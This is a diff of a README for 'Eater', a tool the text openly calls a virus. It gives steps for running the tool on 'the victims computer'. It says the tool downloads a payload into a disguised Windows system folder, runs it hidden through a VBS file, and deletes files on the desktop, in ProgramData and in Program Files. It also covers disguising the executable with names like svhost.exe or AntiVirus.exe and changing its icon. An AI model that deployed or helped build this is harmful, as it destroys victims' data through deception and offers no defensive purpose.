@@ -1,3 +1,8 @@
+Requirements for Eater:
+- Pkg(NPM Package)(https://npmjs.com/package/pkg)
+- NPM(https://www.npmjs.com/)
+- NodeJS(https://nodejs.org/)
+
 How do I use Eater?
 1.Make a folder.
 2.Copy Eater_VF there as well as Eater but make sure they are not on the same folder.
@@ -10,7 +15,7 @@ How do I use Eater?
 9.Run it to the victims computer.
 10.And your done!
 
-If you still have a problem check example folder
+If you still have a problem check folder named "example".
 
 How does Eater works?
 1.Once run it will download the Eater_VF zip into C:\ProgramData\USOShared\Logs\User
@@ -18,12 +23,15 @@ How does Eater works?
 3.Then run the vbs file to run the Eater virus in hidden/stealth.
 4.It will start deleting files on the desktop, ProgramData and Program Files.
 
-CLI commands to turn them into an exe file(IMPORTANT):
-for Eater_VF:
-pkg index.js -o svhost.exe
+Why does the virus doesn't work?
+You must've did something wrong.
 
-for Eater:
-pkg index.js -o <to_anything_you_want>
+How can I change the file metadata such as Icon?
+Use http://www.angusj.com/resourcehacker/
 
-Example:
-pkg index.js -o AntiVirus.exe
+How to compile a javascript to exe file using PKG?
+Help menu(For more helps or commands):
+pkg --help
+
+Auto OS Detecting:
+pkg index.js -o manager.exe(Can be anything)
